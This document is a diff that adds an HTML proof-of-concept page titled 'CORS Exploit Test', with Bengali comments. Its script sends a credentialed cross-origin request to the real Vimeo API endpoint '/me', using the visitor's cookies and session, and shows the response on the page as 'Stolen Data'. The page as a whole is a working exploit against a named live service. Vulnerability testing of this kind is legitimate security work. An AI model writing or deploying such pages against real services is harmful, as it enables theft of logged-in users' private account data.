@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit Test</title>
+</head>
+<body>
+    <h1>CORS Data Theft Test</h1>
+    <p>যদি এই পেজটি লোড হওয়ার পর নিচের বক্সে ডাটা দেখা যায়, তবে বুঝবেন CORS Vulnerability কাজ করছে।</p>
+    
+    <div id="result" style="background: #f0f0f0; padding: 15px; border: 1px solid #ccc; word-wrap: break-word;">
+        ডাটা লোড হচ্ছে...
+    </div>
+
+    <script>
+        // ভিমো এপিআই এন্ডপয়েন্ট
+        var targetUrl = "https://api.vimeo.com/me";
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", targetUrl, true);
+        
+        // এটি সবচেয়ে গুরুত্বপূর্ণ: কুকি এবং সেশন পাঠানোর জন্য
+        xhr.withCredentials = true; 
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                if (xhr.status == 200) {
+                    // সফলভাবে ডাটা চুরি হলে এখানে দেখাবে
+                    document.getElementById("result").innerHTML = "<b>Stolen Data:</b><br>" + xhr.responseText;
+                    console.log("Stolen Data:", xhr.responseText);
+                } else {
+                    document.getElementById("result").innerHTML = "Error: " + xhr.status + "<br>সার্ভার রেসপন্স করছে না বা ব্লক করেছে।";
+                }
+            }
+        };
+        
+        xhr.send();
+    </script>
+</body>
+</html>
